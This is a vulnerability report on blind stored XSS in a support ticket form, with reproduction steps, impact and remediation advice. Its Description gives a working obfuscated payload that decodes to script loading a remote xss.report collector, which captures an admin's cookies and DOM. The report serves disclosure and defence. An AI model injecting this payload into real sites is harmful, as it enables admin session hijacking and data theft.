## Title

Blind Stored XSS in Support Ticket "Subject" and "Message" fields — 64.php

## Affected URL

http://kzlabs.in/64.php

## Description

The Support Ticket functionality's "Subject" and "Message" input fields don't sanitize input before storing them. Payload:
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3NoaXZheSI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=&#61; onerror=eval(atob(this.id))>
was submitted in these fields. The payload breaks out of the current attribute context, injects an <img> tag with a base64-encoded script (decoded via atob) stored in the id attribute, and executes it via onerror. The base64 payload dynamically creates a <script> tag pointing to an xss.report collector. Since support tickets are typically reviewed by internal support/admin staff rather than rendered back to the submitting user immediately, this is being tracked as blind XSS pending a callback hit.

## Steps to Reproduce

1. Go to http://kzlabs.in/64.php and open the support ticket form.
2. In the "Subject" field (and/or "Message" field), enter the payload above.
3. Submit the ticket.
4. Monitor the xss.report collector dashboard (/c/shivay) for an incoming callback.
5. A hit on the collector confirms the payload executed when a support agent/admin opened the ticket to view it, along with captured cookies, DOM, and referring page URL.

## Proof of concept



https://github.com/user-attachments/assets/65488277-3097-45f4-b864-b4678ab8dba7




## Impact

Since support tickets are almost always reviewed by internal staff/admins in a backend panel, this has high potential impact — if a support agent opens the ticket, their session cookie, DOM, and access level could be exposed to the attacker. This could lead to support/admin panel takeover, access to other users' ticket data, or further internal system compromise depending on what privileges the viewing account has.

## Remediation

1. HTML-encode Subject and Message field values everywhere they're rendered, including internal support/admin panels — these are common blind spots since internal views get tested less than public pages.
2. Strip or sanitize HTML tags from ticket fields entirely if rich formatting isn't required; if it is, use a strict allow-list sanitizer (no <img>, <script>, on* handlers).
3. Add a CSP to restrict inline event handlers and external script loading, especially on the support/admin dashboard.
4. Set HttpOnly + Secure on session cookies used by support/admin accounts to limit damage if this fires there.
